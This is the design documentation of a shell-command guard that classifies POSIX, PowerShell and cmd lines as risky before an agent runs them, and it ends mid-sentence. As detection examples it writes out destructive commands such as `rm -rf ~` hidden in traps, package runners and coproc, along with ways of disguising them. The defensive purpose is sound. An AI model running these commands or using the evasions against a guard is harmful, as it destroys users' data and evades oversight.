# Shell

`milo-guards-shell` judges a shell line before it runs. It reads POSIX shells
(`sh`, `bash`, `zsh` and the ones that share their syntax), PowerShell and
Windows `cmd`.

```rust
classify(line, shell, &paths) -> Assessment
effect(line, shell, &paths) -> Effect
```

`shell` is a `Shell` (`Posix`, `PowerShell` or `Cmd`), which is
`#[non_exhaustive]`: a shell with a grammar of its own may be added, so a
caller's `match` on it needs a fallback arm. `paths` comes from
`Paths::new(cwd, home, workspaces)`.
The answer is `Safe`, or `Risky` with every finding: a rule, a reason a prompt
can show, and the argument it is about. The guard reads the line and never runs
it. It touches neither the file system nor the environment.

`effect` is a second answer from the same split: does the line only read? See
[Reads only](#reads-only). `explain` shows how a line was read, for a person
debugging a verdict: see [Explaining a line](#explaining-a-line).

The guard only reports. What to do about a finding is the caller's choice, and
nothing here knows about asking, refusing or modes. The types are core's; see
[Core](core.md).

## How it works

A line is judged in three steps.

1. **Split** the line into units, one for each program it runs.
2. **Detect**: rules read each unit and judge each path.
3. **Combine**: the line is safe only when no unit is risky. A risky line
   carries every finding.

The modules follow the steps. `posix`, `powershell` and `cmd` split a line with
their grammar. `launch` takes wrappers off and reads scripts handed to shells.
`unit` holds the unit and the helpers that read its arguments. `detect` holds
the rules. `path` is the shell's side of the path model.

## Splitting

The line is split with the grammar of the shell that runs it. The caller says
which shell, with `Shell::Posix`, `Shell::PowerShell` or `Shell::Cmd`.
`Shell::for_program` maps a name such as `/bin/zsh` or `pwsh.exe` to one. The
parsers are tree-sitter's bash, PowerShell and batch grammars.

- Chains (`&&`, `||`, `;`), pipes, substitutions (`$(...)`), loops, blocks and
  subshells are walked.
- **Every branch counts**, whether or not it would run. `false && rm -rf ~` is
  risky.
- Where a grammar reads a line differently from the shell, the shell wins.
  A POSIX line's backslash-newlines are joined first, so `r\<newline>m` is
  `rm`. cmd's built-ins also split arguments at `,`, `;` and `=`. PowerShell's
  `--%` ends at `|`. PowerShell reads `$HOME\.ssh\id` as one word but its
  grammar fails at the backslash, so such a word is put in quotes first. A cmd
  "comment" that hides a command cannot be read.
- Fish has no grammar here. Its line is read as POSIX, which is still safe:
  what the grammar cannot parse comes back risky.

### Wrappers and scripts

Wrappers come off: `sudo`, `env`, `nice`, `timeout`, `xargs`, `find -exec`,
`Start-Process`, `start`. `sudo rm` is `rm`, run as root. So do the words that
run the command after them in a POSIX shell: `command`, `builtin`, zsh's
precommand modifiers `noglob`, `nocorrect` and `-` (they take no options, so
`noglob -- rm` runs a program named `--`), and `coproc`.

**Package runners** come off too, with each runner's own options skipped:
`npx`, `npm exec`, `pnpm dlx` (also `pnpx` and `pnx`, its aliases), `pnpm exec`,
`yarn dlx`, `yarn exec`, `bunx`, `bun x`, `deno x`, `dx`, `uvx`, `uv tool run`, `uv run`, `pipx run`. The
program the runner names is judged, with a version after the package taken
off (`npx rimraf@5`). Where the runner names the package apart from the
program (`npx -p pkg prog`, `uvx --from pkg prog`) the program is the one
after the options. An option that takes a value is skipped with it, because
one that is missed would turn its value into the program, so each table is
the runner's own list and not a guess: npm's is every setting of its config
definitions that is not a boolean with its shorthands (`npm -C dir`, `npx
--editor vim`, `npm exec --logs-dir x`), read as npm reads them (an
unambiguous start of a name is the option, `--ed vim`; `npm exec` takes a
`true` or `false` after a boolean; `npx` first puts its own `--` before the
program, so a word it took for a value that npm did not is the program);
pnpm's is its own string and number settings, `exec`'s `--resume-from`,
`dlx`'s `--allow-build` and npm's settings, which it reads too; yarn's is
the options of `yarn --help` that name a folder, a host, a number or a type;
bun's is the `--option=<val>` options of `bun --help` that also take the next
word (not `-c`, `--config` and `--inspect`, whose value only follows `=`);
bun itself takes the first word that does not start with a dash as its
subcommand, before any option reads a value (`bun -c rimraf a` runs `rimraf`,
`bun -F x echo` runs `bunx echo`, `bun --title repl` opens the REPL), so that
word is read too, and when it is `x`, `run`, `exec`, `repl` or a delete tool
both readings are judged and the riskier one counts (the two share the wrappers a line may have and at most 32 such forks are made in a line, past which it is unreadable, so a line that forks at every `bun` is too wrapped like any other, not slow); deno's is its option definitions that take one value; uv's is `uv run --help` and the hidden
options real uv still takes a value for (`--python-preference`,
`--python-fetch`, `--max-recursion-depth`); pipx's is `pipx run --help`
(`--fetch-missing-python` is a flag). `npm exec` and `npm x` take the first
`--` for themselves, before the program or after it (`npm exec sh -- -c
'cmd'` runs `sh -c 'cmd'`); `npx` hands it on. `npx -c`, `npm exec -c` and
`pnpm -c exec` (the option may stand before `exec` too) run a shell command,
and so does `yarn exec`, whose arguments are a script. npm's `-c` is found as
npm reads it, among every option before the program, also before `exec`: at
the end of a bundle (`npx -yc 'cmd'`), spelt `--c`, given its value after `=`
(`npx -c='cmd'`), or put before the subcommand (`npm -c 'cmd' exec`). A bundle
of any length is read to its end, never given up on as the program. Each is
read as a script: in cmd where the line is for Windows (npm and pnpm start the system
shell there, and PowerShell's own grammar does not apply), in POSIX otherwise.
`yarn` (also `yarn run`) and `bun` (also `bun run`) start a delete tool by its
name (`yarn run rimraf dist`). `pnpm NAME` runs the script NAME of the project
and, with none by that name, the program (pnpm: "will execute the command as a
shell script"), so it is read as `pnpm exec NAME` unless NAME is a command of
pnpm, its alias, or an npm command it passes on (`pnpm rm lodash` removes a
dependency): `recursive`, `multi` and `m` are pnpm's own spellings of `-r`, so
`pnpm recursive exec rm -rf ~` is read as `pnpm -r exec rm -rf ~`; `pnpm sh -c 'rm -rf ~'` and `pnpm find ~ -delete` are read like
the program, `pnpm rimraf dist` is a delete tool, and an unknown script name
(`pnpm lint`, `pnpm dev`, `pnpm build`) is safe. `bun run name`
also starts any program on the path when it is no script (`bun run rm -rf
x` deletes): a word after `bun run` and its options that is no file (no
folder in it, no extension) is judged as the program, so `bun run build` is
safe as an unknown name and `bun run sh -c 'rm -rf ~'` is read like `sh -c`.
Bare `bun name` runs only scripts and bins of the project, so only a delete
tool is read there. The delete tools that come as packages (`rimraf`, `del`
and `del-cli`, `premove`, `rmrf`) delete their operands, judged as `rm` judges them: `bunx rimraf /` and `pnpm dlx rimraf ~`
are `Delete`, `npx rimraf dist` is safe. Only `del` and `del-cli` have a dry
run, and only `--dry-run` is read as one: `del -n ~` deletes as far as the
guard knows. What a runner starts is a program, never a builtin of the shell,
so `npx cd src` does not move the rest of the line to `src`.

`bun` and `deno` are interpreters. `bun -e`, `--eval`, `-p`, `--print` (also
in a bundle, `bun -pe 'code'`, or with the code attached, `bun -e'code'`),
`bun repl`, `deno eval`, `deno repl`, a bare `deno` and a script read from the
input (`bun run -`, `deno run -`, `uv run -`) run code the guard does not
read: `Unknown`, or `RunDownloaded` after a download. The options before the
subcommand are skipped with their values (`bun -d x:1 -e 'code'` is still
inline code). `bun exec 'script'` runs a shell script, read as POSIX like `sh
-c`. `bun run file`, `deno run file` and `bun file` are judged like `node
file`, so a script the same line writes is not read, also after options (`bun
--hot run file`) and after deno's `watch`, which is `run --hmr`. So is `uv run
file.py`, and `uv run --script file`: `uv` runs Python on the file, like
`python file`. `deno run npm:pkg` runs the package's program like a runner,
and so do `deno watch npm:pkg` and `deno npm:pkg`: deno's default subcommand
is `run`. `deno x` and `dx` are package runners, like `bun x`. In cmd lines
these runner parts of `bun`, `deno` and `dx` are read as in the other shells
(`bun x rimraf C:\`, `bun run rimraf C:\`, `deno run npm:rimraf C:\`,
`dx rimraf C:\`); what they read of an interpreter (inline code, a script
from the input, `bun exec`) is not. `deno -v` and `deno --help=full` only
print. The options of `deno` that take their value
only after `=` (`--reload`, `--env-file`) do not take the next word.

`coproc` is read as the shells read it. A simple command takes no name, so the
first word is the program (`coproc NAME cat` runs `NAME`); a group may take
one (`coproc NAME { … }`). The program is the first word past the name, the
`{` words that open the group (`coproc { { rm -rf ~; }; }` is read through
both), `NAME=value` words and `!`, as it is without `coproc`: `coproc FOO=1 rm
-rf ~`, `coproc { ! rm -rf ~; }` and `coproc NAME { FOO=1 rm -rf ~; }` judge
the `rm`. The grammar has no `coproc`, so three forms are not read, and are
risky:

- A loop, conditional, `case` or function after it, or inside its group
  (`coproc while …; do …; done`, `coproc NAME { for …; do …; done; }`), is cut
  into pieces whose body hides behind the program `do`: `Unreadable`.
- A redirect in front of the command (`coproc { 2>/dev/null rm -rf ~; }`,
  `coproc > out rm -rf ~`): the grammar takes the words after its target for
  more targets, so the command is not among the arguments: `Unreadable`.
- A `{` stuck to a word (`coproc {rm -rf ~;}`): zsh runs it as a group, the
  grammar reads `{rm` as a program of that name: `Unreadable`.

A script handed to a shell is split again, in its own grammar: `bash -c`,
`eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. A nested script
counts as far as a depth limit, and the text of all the nested scripts read
for one line as far as a budget a few times the longest line. Past either, the
line is unreadable.

The other limits, each read as unreadable past it, and each pinned by a test
that finds the edge by measuring it and asserts both sides (see Tests):

| Limit | Value | What it bounds |
| --- | --- | --- |
| Line length | 64 KiB | text parsed at all |
| Parse tree depth | 400 levels | the walk, so the stack |
| Shells in shells | 8 | `bash -c "sh -c '…'"` |
| Wrappers in front of a program | 15 | `sudo env nice … rm` |
| `find` inside `find -exec` | 16 | the walk, so the stack |
| `find -exec` work | 1 MiB | each level runs its program once per place it searches, so levels multiply; counted in the bytes built to hand on, `{}` replaced, because a count of arguments misses one that holds thousands of `{}` |
| Opening `(` with none closed | 400 | counted before parsing, blind to quoting; only `(` is counted, not `{` or `[`: cmd's grammar takes time that grows with the square of the depth |
| `&`, and `|`, in cmd | 400 of each (`&&` and `||` once) | counted before parsing: cmd's grammar nests a chain a level for each, so past the parse tree depth the line is unreadable anyway, and for `&` it takes time that grows with the square of the chain to find that out (a chain of 7,280 commands took 1.6 s on one machine and 2.5 s on another) |
| Here-documents started on one line (POSIX) | 256 | counted before parsing: bash's grammar holds each until the line ends (a backslash continues it) and takes time that grows with the square of how many; here-strings are not counted, and nor are here-documents that follow a command on lines of their own (`cat <<A\n` repeated costs the text and no more); with no command before the `<<` the grammar is slow, see the noise below |

The grammars themselves take time that grows with the square of the line on
some noise that none of the counts above covers. Measured in a release build
at 65,000 bytes (the longest line), in POSIX: `)` repeated takes about 10 s, `)a`
repeated (32,000 times, so not only a run of one character) about 9 s, `a|`
repeated 19.7 s, `|` or `>` repeated 4 to 5 s, and `<` repeated 3 s; here-documents
with no command before the `<<`, which the count above does not reach because
each is closed or on a line of its own: `<<A\nA\n` repeated 3.6 s, `<<A;\n`
4.0 s, `<<A\n` 4.9 s, and `<<A;` sixteen to a line (under the count) 5.4 s (`cat <<A\n` repeated
takes 1 ms, so the cost is in the missing command); in PowerShell, `echo ` then
`${` repeated 17 s, and `"${` repeated 3.5 s; in cmd, `@` repeated about 10 s.
Another machine took twice as long (20 s for `)` and for cmd's `@`, 9.5 s for
`|` and `>`, 6.7 s for `<`, 19 s for `)a`). A debug build is about three times
slower (29 s for `)`). cmd's `&` and `|` are counted above. A real line
never has them, and they come back risky, so the guard is slow there, never
wrong.

The open-`(` count does not catch brackets that close. Balanced ones take
time too, measured in a release build at 64 KiB on the same branch: in POSIX,
`()` repeated 9.0 s and `f() ` repeated 1.1 s; in cmd, `(echo) ` repeated
5.2 s, and `echo ` then `$((1<<2)); echo ` repeated 3.2 s. These are examples
of what was measured, not every slow shape: a new measurement can find
another, and the list is not a promise that anything else is fast.

### Actions that run later

Some commands only register a script, which runs when something happens
rather than now. The script is read where it is written, in its own grammar,
and its findings are the line's, since the shell runs it as the same user.

- **`trap`** in a POSIX shell: `trap 'ACTION' SIGNAL…`, also `trap -- 'ACTION'
  …`, whichever signal (`EXIT`, `0`, `INT`, `TERM`, `ERR`, `DEBUG`, `RETURN`,
  `HUP`, a number, several at once). The action is read like an `eval`'s
  script: `trap 'rm -rf ~' EXIT` deletes the home directory. A double-quoted
  action is expanded when the trap is set and its result read as code when it
  runs, as `eval "…"` is, so whatever an expansion holds becomes code: `trap
  "echo $d" EXIT` is `unknown`, with the reason `runs a script only known when
  it runs`, like `eval "$x"`, and so is `trap "$x" EXIT`. The text around the
  expansions is still read, so `trap "rm -rf $d" EXIT` also carries the
  `delete` of `$d`, a path known only when it runs. `$HOME`, `$PWD` and
  `$TMPDIR` are the places the guard names and are not counted as
  expansions. A single-quoted action is not expanded when set and is read as
  written: `trap 'rm -f "$tmp"' EXIT` is `rm -f "$tmp"`, and `trap 'echo $d'
  EXIT` is safe.
- **Nothing runs** for `trap - EXIT` and `trap -- - INT` (put the default
  back), `trap '' INT` (ignore the signal), `trap -p`, `trap -l` and a bare
  `trap`.
- **PowerShell**: the block of `trap { … }`, and the block given with
  `-Action` to `Register-EngineEvent`, `Register-ObjectEvent`,
  `Register-WmiEvent` and `Register-CimIndicationEvent`. The grammar reads a
  block in place, so its commands are judged as if they stood on the line,
  and an action that is not a block written out is a script known only when
  it runs, which is `unknown`: `-Action $block`, `-Action ([scriptblock]::Create($t))`,
  an action given by position (`Register-EngineEvent X $block`) and any splat
  (`Register-EngineEvent @p`). By position, the action is the last of the
  parameters the command's names leave to be given by position, in the docs'
  order: source then action for `Register-EngineEvent`; object, event, source
  then action for `Register-ObjectEvent`; class or query, source then action
  for `Register-WmiEvent` and `Register-CimIndicationEvent`.
  `Register-ObjectEvent $timer Elapsed`, with no action, is safe.
- cmd has nothing like it.

The action runs in this shell, later: after the line's last command, or
between its commands (`DEBUG`, `ERR`, `RETURN`, a signal). It is judged as the
line leaves things, whichever is more conservative and needs the least state:

- **Where it runs.** Its relative paths are judged from where the line was
  at the `trap`. A `cd` (or `pushd`, `popd`, `Set-Location`) after it, anywhere
  in the line, makes those paths known only when it runs: `trap 'rm -rf
  build' EXIT; cd ~` deletes a path known only when it runs. A `cd` inside
  the action may run before the next command, so the rest of the line is read
  from somewhere unknown too. An absolute path or `~` is the same wherever the
  line has moved. A `cd` in a subshell, `$(…)` or a script in a process of
  its own is not a move of this shell, as it is not for any later path, so
  `trap 'rm -f lock' EXIT; (cd sub && make)` still runs `rm -f lock` from
  where it was set. `eval` runs in this shell, so its `cd` is a move.
  The exception is a trap a subshell copies: `ERR` and `DEBUG` (zsh also
  `ZERR`) in zsh, `ERR` with `set -E` and `DEBUG` and `RETURN` with `set -T` in
  bash, also in `$(…)`. It runs from where the subshell has moved to as
  well, so for these (and for a signal the guard does not know, or one known
  only when it runs) any `cd` after the `trap` counts, subshell or not:
  `trap 'rm -rf build' DEBUG; (cd /; true)` is a delete of a path known only
  when it runs. `EXIT` and the ordinary signals are reset in a subshell and
  keep the rule above.
- **Names in a finding.** A double-quoted action is read from its text with
  each expansion replaced by a placeholder variable; a finding about it names
  the action as written, never the placeholder.
- **Hidden names.** The action is a body (see Bodies below): when the line
  turns `dotglob` on anywhere, even after the `trap`, its wildcards match
  hidden names. An off switch inside it changes nothing for the rest of the
  line, and an on switch inside it stays on.
- **Nesting.** A `trap` inside a script, a `bash -c` or another `trap` counts
  as far as the depth limit. A `$(…)` in a double-quoted action is read where
  it stands, when the trap is set, and is a placeholder variable in the text
  the action is read from, so it is not read twice.

### Where a line is

A `cd` (or `pushd`, or `Set-Location`) moves the rest of the line. A later
relative path is judged from where it moved to. A `cd` inside a subshell or a
nested script in a process of its own does not reach the rest of the line;
`eval` runs in this shell, so its `cd` does; in a pipeline only zsh runs the
last stage in this shell, but, as for a `cd`, any stage counts. Where a `cd` went is
unknown when its target is, and then so is every relative path after it.
A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
so it is read as written, before the path is joined to where a `cd` moved:
`cd $dir; python x.py > $null` writes nothing, while `> out.txt` stays an
overwrite of a file only known when it runs. `$null` is the device only in
PowerShell, and only as the null value itself. In a POSIX shell it is the variable
`null`, only known when it runs; in cmd, and quoted in PowerShell (`'$null'`), it
is a file name like any other, joined to where the `cd` went.

In PowerShell, `cd -` and `cd +` go back or forward in location history, so the
place is only known when it runs.

In PowerShell a bare `NUL` or `CON` is the device only on the file system.
After a `cd` to the registry, `Env:`, `Variable:`, `Function:` or `Cert:`, or to
a place only known when it runs (it may be a registry key), it is an ordinary
item name there, so deleting, moving or changing it (`Remove-Item NUL`,
`Move-Item NUL x`, `Set-ItemProperty NUL`, `New-Item NUL`) changes the item of
that name, and a bare name is joined to where the `cd` went like any other.
Writes by a file system path (`> NUL`, `Out-File NUL`, `Tee-Object NUL`,
`Invoke-WebRequest -OutFile NUL`) fail in such a provider and stay harmless.
`Set-Content`, `Add-Content` and `Clear-Content` do not: the `Env:`,
`Variable:`, `Function:` and `Alias:` providers take content, so
`cd Function:; Set-Content NUL ...; NUL` defines and runs a function named `NUL`,
and they are judged as an item of the folder like a delete. So is the
destination of `Copy-Item` and `Move-Item`, which in the registry is a key.
A `$null` destination of those is no destination, so the item goes to the
folder the line is in. So does a `$null` or missing path of `New-Item` (with
`-Name` the path is optional). With `-Name` the item is `Path\Name`, judged as
that one path, so a `..` in the name is applied and a device path (`NUL`, `CON`)
is never the item itself. `$null` is the null value in any provider.

In PowerShell a rooted path with no drive (`\x`, `/x`, as in `cd \`) is on the
drive of the folder before it, so after `cd HKCU:\Software\Foo` it is
`HKCU:\x`, and after `cd Function:` it is `Function:\x`; it is on the file
system only when the folder before it is (a disk, or no earlier `cd` at all).
When that folder is only known when it runs, or is a provider path with no drive (`Registry::HKEY_CURRENT_USER\...`),
so is the rooted path. `~` is the home of the provider the folder is in, and
only the file system has one: after a `cd` to the registry, `Function:`, a
provider path, or a place only known when it runs, `cd ~` fails and the line
stays where it was, so a path starting with `~` is only known when it runs, and
so is a `cd` with no path. A `Set-Location` or `Push-Location` that is not the
first stage of its pipeline gets its path from the pipeline, not from home. A
drive's name may hold any character but `: / \ . ~` (`my_reg:`), so any such
name before a colon, other than one letter, is a drive that is not a disk. Once
the line makes a drive (`New-PSDrive`, `ndr`, `mount`), anywhere in its text,
even after the `cd` (a function body, a loop), a single letter in a `cd`
(`cd X:`) may be that drive and not a disk, so the place is only known when it
runs. Without one, a letter is a disk.
After a `cd` to a known place on the file system, the device is read as
written for every command. cmd and POSIX have no other provider.

A variable that names a place (`$HOME`, `%TEMP%`, `$env:TEMP`) stops naming it
once the line sets it anywhere: `TMPDIR=$HOME`, `set TEMP=...`, `unset HOME`.

### Hidden names

A POSIX wildcard skips a name that starts with a dot, so `rm -rf *git` leaves
`.git` alone. A line can switch that off, and then `*git` takes `.git`: bash's
`shopt -s dotglob`, zsh's `setopt globdots` (also spelled `dotglob`),
`set -o globdots`, and a non-empty `GLOBIGNORE` (bash turns `dotglob` on for
it). Once a POSIX line has turned one on, every later pattern in that shell is
judged as core judges a PowerShell or cmd wildcard: it can match a leading dot
(see [Core](core.md)). Each unit and each redirect carries the flag, like the
folder a `cd` moved to.

- **On.** `shopt -s dotglob` (also with `nullglob` and the like, `-sq`);
  zsh's `setopt globdots`, `GLOB_DOTS`, `glob_dots`, `dotglob` and `DOT_GLOB`
  (zsh ignores case and underscores), `unsetopt noglobdots` and `unsetopt
  nodotglob`; `set -o globdots`, `set -o dotglob`; zsh's flag `-4` for
  `set` and `setopt` (`+4` undoes it); `setopt -m` and `unsetopt -m` with any
  pattern, which may name it. An option name or flag only known when it runs
  counts as on.
- **`GLOBIGNORE`** turns it on when it is not empty: as `GLOBIGNORE=x` on a
  line of its own, after `export`, `declare`, `typeset`, `local` or `readonly`
  (quoted too: `export "GLOBIGNORE=x"`), with `+=`, as `let GLOBIGNORE=1` or
  `(( GLOBIGNORE=1 ))`, as `read GLOBIGNORE` or `printf -v GLOBIGNORE`, or as
  a `for` variable. An empty value turns nothing on. A command with
  `GLOBIGNORE=x` in front of it, or after `env`, was expanded by the shell
  before the variable applies, so only a script it starts (`GLOBIGNORE=x bash
  -c '…'`) is judged with it on. `BASHOPTS=dotglob` does the same for the bash
  it starts; as a statement it counts as on.
- **A shell's own start-up options** turn it on for the script that shell runs:
  `bash -O dotglob -c '…'`, `zsh -o globdots -c '…'`, `zsh -o dotglob`, `zsh -4`,
  `zsh --globdots`, and a name only known when it runs.
- **`source` and `.`** run a file the guard cannot read, which may turn it on,
  so a line that sources one is judged with it on afterwards.
- **Two flags.** The guard keeps bash's option and zsh's apart, and hidden
  names match when either is on. Bash's is turned on by `shopt -s`,
  `GLOBIGNORE` and `BASHOPTS`, and off by `shopt -u` and `unset GLOBIGNORE`
  (`unset -f GLOBIGNORE` removes a function and changes nothing). zsh's is
  turned on by `setopt`, `unsetopt no…`, `set -o globdots` or `dotglob`, and
  `-4`, and off by their opposites. `source`, a shell started with the option
  on, and a name only known when it runs turn both on. An off switch clears only
  its own flag, since in the other shell it is an error: `setopt globdots;
  shopt -u dotglob; rm -rf *git` and `shopt -s dotglob; unsetopt globdots; rm
  -rf *git` are still risky.
- **Off.** `shopt -u dotglob`, `unsetopt globdots`, `set +o globdots` and
  `unset GLOBIGNORE` turn their flag off, but only where the line is sure to run
  them in this shell. They count when the unit is reached directly or through
  `command`, `builtin`, `time`, `!` or `eval`, except that zsh's `command` does
  not count for zsh's flag (it looks up programs only) and `time` counts only
  in front (later it is the program of that name). zsh's `noglob`, `nocorrect` and
  `-` count for zsh's flag only: in bash and sh they are not found and the
  builtin after them never runs, so `shopt -s dotglob; noglob shopt -u dotglob;
  rm -rf *git` is still risky and `setopt globdots; noglob unsetopt globdots;
  rm -rf *git` is not. `nocorrect` is a reserved word in zsh, so like `time` it
  counts only in front, alone or after a leading `time` or `nocorrect`; after
  `noglob`, `-` or `builtin` zsh looks it up as a command and fails, so
  `setopt globdots; noglob nocorrect unsetopt globdots; rm -rf *git` is still
  risky. Behind `env`, `nohup`, `timeout`, `nice`, `stdbuf`,
  `sudo` or `find -exec` they run in a process of their own and change nothing.
  In a pipeline, after `&`, on the right of `&&` or `||`, in an `if`, `case`,
  loop or function body, they change nothing either: the line may not run them,
  or runs them in a subshell, so the rest stays judged with the option on.
- **Where it reaches.** It stays on for the rest of the line. A subshell,
  `$(…)`, and a script in a process of its own (`bash -c '…'`) give it back as
  it was: an option set inside `bash -c 'shopt -s dotglob'` does not reach the
  units after it. A script started while it is on inherits it, since an
  exported `GLOBIGNORE` would reach it. `eval` runs in this shell, so its change
  stays, except that an `eval` that is a stage of a pipeline runs in a subshell
  and can turn the option on but not off. An on switch in any pipeline stage
  reaches the units after it, which is conservative: zsh runs the last stage in
  the current shell, so `setopt globdots | cat; rm -rf *git` is risky.
- **Bodies.** A function body or a loop may run after the option is on, whenever
  it is called or comes round again. The guard records the units and redirects
  in them, and after the whole line is read, if the line ever turned the option
  on (anywhere, a script it ran included, even if it turned it off again), it
  judges them with it on: `f() { rm -rf *git; }; eval 'shopt -s dotglob'; f`.
  A script started with the option on (`bash -O dotglob -c f`, `GLOBIGNORE=x
  bash -c f`) counts, since the line may have exported a function to it, and so
  does a `GLOBIGNORE=x` in front of a call to a function the line defines
  (`GLOBIGNORE=x f`), which sets it while the body runs. A
  line that never turns it on is not changed by a body that only mentions the
  name (`echo dotglob`).
- **Listings.** A listing hands its pattern on with the flag it was written
  under, so `shopt -s dotglob; ls -d *git | xargs rm -rf` is the delete of
  `*git` with hidden names matching.

Not read, so the caller has to account for them: an option set by `~/.zshenv`
or `~/.bashrc`, a `BASH_ENV` file, an inherited `GLOBIGNORE` or `BASHOPTS`
from the environment the guard's caller runs in, and a `GLOBIGNORE` set by
`${GLOBIGNORE:=x}`. zsh's `(D)` glob qualifier (`rm -rf *git(D)`) is not read
either.

## The rules

A rule reads a unit's program, its flags, its operands and its redirects. It
never reads the raw text. `echo "rm -rf /"` is safe, because the program is
`echo`.

| Wire name | What it finds |
| --- | --- |
| `delete` | Deletes files beyond the workspace, the workspace itself, a sensitive or protected file, or a path known only when it runs. |
| `wipe_disk` | Formats, repartitions or writes over a disk. |
| `overwrite` | Writes into a file beyond the workspace, or a sensitive or protected one, or one a tool runs on its own. |
| `git_discard` | Throws away work git cannot give back: uncommitted changes, untracked files, stashes, unmerged branches. |
| `git_remote` | Rewrites or deletes branches on a remote. |
| `git_history` | Rewrites the repository's history, or what git keeps to recover it. |
| `permissions` | Changes permissions or ownership beyond the workspace or of a protected file, or opens files to everyone. |
| `system_settings` | Changes how the system runs: the registry, boot settings, restore points, accounts, the firewall, antivirus, script policy. |
| `read_secret` | Reads a key or a credential: a file a program opens, or a `<` redirect, that lands on a place core marks as holding one; also a disk, and what the kernel serves. See [Reading a key](#reading-a-key). |
| `elevated` | Runs as root or administrator. |
| `run_downloaded` | Runs a script it downloads. |
| `run_input` | Runs commands read from its input (a pipe, a here-document), which the line does not show. |
| `stop_system` | Shuts the computer down, restarts it, or stops every process. |
| `send_secret` | Sends a key, a credential or the environment off the machine. |
| `unknown` | Runs a program or a script known only when it runs. |
| `unreadable` | The line, or part of it, cannot be read. |

The wire names never change. A reason is a few plain words that follow from
the rule: `deletes your home directory`, `runs code the guard does not read`.

### The rule enum is exhaustive on purpose

`shell::Rule` is not `#[non_exhaustive]`. A caller decides what to do with each
rule (ask, refuse, allow), so a rule added here must break every caller's
`match` at compile time. With a fallback arm instead, the new rule would pass
through whatever policy the fallback has, and nobody would have chosen it. So a
new rule is a change a caller meets when it bumps its `rev` and fails to
compile, and it decides then; see
[how a change reaches a caller](../../CONTRIBUTING.md#how-a-change-reaches-a-caller).
(`Shell`, core's `Place` and `Shape` are the other way round: they are
`#[non_exhaustive]`, because a caller reads them rarely and a new one is not a
policy decision.)

`Rule::name` is an inherent `const fn`, so a caller needs no trait import, and
core's `RuleName` trait delegates to it. `Rule::ALL` lists every rule once.
Both are in the order of the table above.

## Paths

A path is judged by where it resolves against the working directory (moved by
any `cd`), the home directory and the workspace folders. The path model is
core's; see [Core](core.md). This guard adds what only a shell's syntax gives
a path.

- `~` is the home directory. `~user` is another user's, which the spelling
  does not say, so it is unknown.
- `$HOME`, `%USERPROFILE%` and `$env:TEMP` are the places they name.
- A PowerShell word that is a variable and a path (`$HOME\.agent\config.yaml`,
  `$env:USERPROFILE/x`, `${HOME}\x`) is an expandable string. The grammar
  fails on it, so the line is `unreadable` as it ever was; and it is read
  again with such words put in double quotes (a word of plain path characters
  after a name, where a word can begin; a line with a here-string, or a
  subexpression in a string, is read as written), so that the rules see the
  paths. What the second reading finds is added; the line stays `unreadable`.
- A PowerShell drive such as `HKLM:` is the registry. Any other drive, such as
  `Env:`, is outside the workspace. The drive is read before a wildcard, so
  `HKCU:*` is the registry like `HKCU:\*`.
  A drive's name is whatever comes before the first `:` when that holds no
  separator, no wildcard and no `.`, so a drive made with `New-PSDrive`
  (`my_drive:*`, `my-drive:\*`) is a drive, outside the workspace, and
  `x.txt:stream` is a file's stream, not a drive.
- The item cmdlets are judged by where their path lands, as `Remove-Item` is:
  `Clear-Item`, `Rename-Item`, `Set-Item`, `New-Item`, `Move-Item`,
  `Copy-Item` (its destination), the `-ItemProperty` cmdlets and their
  aliases. A registry place is `system_settings`: `Clear-Item HKCU:\Software\x`,
  `Rename-Item HKCU:\Software\x y`, `Set-Item HKLM:\SYSTEM\x -Value 1`. A
  rename or move of what lies beyond the workspace is `delete`, and a
  `Set-Item` or `Clear-Item` on another drive (`Env:`, `Variable:`) is
  `overwrite`, as writing to it is. `Rename-Item src\a.rs b.rs` is safe, but a new name only known when it runs
  (`Rename-Item src\a.rs $name`, `-NewName { $_.Name + 'x' }`) is `overwrite`,
  as it may be a startup file's. With
  no path, the four that act on an item work on what the stage before lists (or `$_`), except that a
  listing of the whole workspace by `Get-ChildItem`, `ls` or `dir`, or a
  `Get-Item` pattern such as `Get-Item *`, is its contents, not the workspace
  itself; `Get-Item .` or `Get-Item D:\ws2` hands on that folder, as written.
  `Clear-Item` and `Set-Item` take a list of paths, so each is judged (`Clear-Item src\a, HKCU:\Software\y`; with no `-Value`, the last of `Set-Item`'s positionals is the value); a common parameter's value (`-ErrorAction 0`) is never read as the path.
- A drive-relative path (`C:x`, `C:*`: a letter, a colon, and no separator) is
  from that drive's own working directory, and so is a bare `C:`. On the drive
  the working directory is on, it is relative to it; on any other drive it is
  outside the workspace. After a `cd` it is unknown, except that after `cd C:`
  a relative path is `C:x`, a path on that drive.
- A listing hands its pattern on as written, so it is read the same way: the
  drive is not part of the pattern (`Get-ChildItem C:* | Remove-Item` takes the
  whole working directory), and a provider-qualified one
  (`Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER*`) is judged on the
  provider's own path.
  A drive's root listed (`C:\*`) is the root, not the drive's working directory.
- A PowerShell provider-qualified path (`FileSystem::C:\x`) is its provider's
  own path.
- A path built at run time, or by a brace list such as `{~,x}`, is unknown.
- `NUL` is the null device in any folder, and so is PowerShell's `$null` value (see "Where a line is"); in PowerShell a bare `NUL` or `CON` is one only on the file system. In a POSIX shell `$null` is the variable `null`, only known when it runs; in cmd, and quoted in PowerShell, it is a file name. In a longer PowerShell word `$null` is the empty string: `$null\Windows` is `\Windows`, a folder at the top of the disk.
- In PowerShell and cmd a name is read the way Windows reads it: `.git.`, `.git `
  and `GIT~1` are the repository's history, and `x.txt:stream` is known only
  when it runs (see [Core](core.md#what-core-judges)).

Inside a workspace or a temporary directory is the agent's own. Not the agent's
own: the home directory, a system folder, the root of a disk, the workspace
itself, its `.git`, keys and shell startup files, and the paths the caller
protects.

### Files a tool runs on its own

A workspace holds files that something runs without anyone typing a command:
`.vscode/tasks.json` (the editor), `.envrc` (direnv, on `cd`), `.husky/*` and
`.pre-commit-config.yaml` (git hooks), `.github/workflows/*` and
`.gitlab-ci.yml` (CI, with the repository's secrets), `.devcontainer/*` (the
container build), `.mcp.json` (servers an editor starts) and the rest of
core's list (see [Core](core.md#what-core-judges)), at any depth. A line that
writes one is `overwrite` with the reason `writes to a file a tool runs on its
own` (the verb of the line: `edits` for `sed -i`, `creates` for `touch`). The
rule is the same as for every sensitive place: core's `place_into` answers it,
so every writer the guard knows (a redirect, `tee`, `cp`, `mv`, `ln`,
